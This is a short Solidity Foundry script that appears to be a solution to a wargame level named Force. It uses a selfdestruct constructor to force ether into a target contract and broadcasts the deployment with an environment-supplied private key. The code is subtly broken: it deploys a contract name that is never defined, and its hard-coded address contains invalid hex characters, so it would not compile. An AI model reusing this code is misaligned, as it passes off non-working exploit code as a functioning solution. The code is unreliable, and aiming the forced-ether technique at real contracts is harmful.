pragma solidity ^0.6.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract ForceSolution is Script {


        constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x87C9D5229A4d58aafw05Cesd3D48DC9291f0813A));
        vm.stopBroadcast();
    }
}
